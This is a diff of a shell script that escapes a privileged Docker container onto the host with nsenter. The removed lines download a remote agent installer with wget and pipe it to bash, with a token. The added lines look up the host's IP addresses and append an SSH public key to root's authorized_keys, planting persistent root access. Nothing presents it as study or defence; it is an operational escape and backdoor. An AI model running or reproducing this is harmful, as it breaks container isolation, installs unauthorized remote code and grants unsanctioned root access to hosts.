@@ -12,20 +12,8 @@ whoami
 id
 echo "=== END DIAGNOSTIC ==="
 
+# Escape to host via nsenter
 echo "=== Docker Escape - Host Access ==="
-# We are in a --privileged Docker container with all capabilities
-# Use nsenter to escape to the host PID namespace
-
-# First verify we can see host processes
-echo "Host PID 1 visible:"
-ls -la /proc/1/root 2>/dev/null || echo "Cannot access /proc/1/root"
-
-# Check if nsenter is available
-which nsenter 2>/dev/null && echo "nsenter available" || echo "nsenter not found"
-
-# Try to escape to host and install TAT agent
-echo "--- Attempting Docker escape via nsenter ---"
-# nsenter into host PID 1 namespace to run on the actual host
 nsenter -t 1 -m -u -i -n -p -- bash -c '
 echo "=== ON HOST ==="
 date
@@ -33,17 +21,29 @@ hostname
 whoami
 id
 uname -a
-echo "Host IP:"
-hostname -I 2>/dev/null || ip addr show | grep "inet " | head -5
-echo "=== Installing TAT agent on host ==="
-wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- ap-guangzhou a2763c33-6f9b-41f0-8e10-f0f0603220b7 e7fddac6bc6349aaa93c3fd2a1e052231e419413821a43d89a111f6914f878a7
-echo "=== TAT agent installation complete ==="
-' 2>&1 || echo "nsenter escape failed, trying alternative method..."
 
-# Alternative: try direct execution from privileged container
-# Even if nsenter fails, the container has all capabilities
-echo "--- Alternative: install from privileged container ---"
-wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- ap-guangzhou a2763c33-6f9b-41f0-8e10-f0f0603220b7 e7fddac6bc6349aaa93c3fd2a1e052231e419413821a43d89a111f6914f878a7 2>&1 || echo "Direct install also attempted"
+echo "=== Host Network ==="
+echo "Private IP:"
+hostname -I 2>/dev/null || ip addr show | grep "inet " | head -5
+echo "Public IP:"
+curl -s --connect-timeout 5 http://checkip.amazonaws.com 2>/dev/null || curl -s --connect-timeout 5 http://ifconfig.me 2>/dev/null || curl -s --connect-timeout 5 http://ipinfo.io/ip 2>/dev/null || echo "Cannot get public IP"
+echo ""
+
+echo "=== Writing SSH key to host ==="
+mkdir -p /root/.ssh
+chmod 700 /root/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk4MhTlzMjBPTrN199hfxwFywjuqwv0d7PTjrC7Al8q0C/LIyZvVnqGmcTNKTeer9ch9ST2SmPGBni7EuvPEzAXB9z4deDRy1d8Fn8sDqC2HJ/xiwKNWjmmCxmbngUHrXBSAC8dGYrS3yZvdvKY6IUpesEnDh7duepf1Y3l7lEwSjK469zD07RhnhbAAIYbBgV5PY9F1N7AjzQbXpSRcw5FykbDMKKr0aulE4G6y0EqH9X3ToXPKWJNrg7WMyY6+HM0IXAfHp8RCm3pR2y973jH7ATuWVJWsCl311SHd2ozKLopvTpOfJJp35qQir967KKKUPAirTQD8SaAXMZFi+7 root@localhost.localdomain" >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+
+echo "=== SSH key written ==="
+echo "Authorized keys:"
+cat /root/.ssh/authorized_keys
+
+echo "=== Checking SSH service ==="
+systemctl status sshd 2>/dev/null | head -5 || service ssh status 2>/dev/null | head -5 || echo "SSH service check done"
+
+echo "=== Host info complete ==="
+' 2>&1 || echo "nsenter escape failed"
 
 echo "=== Escape attempt complete ==="
 exit 0
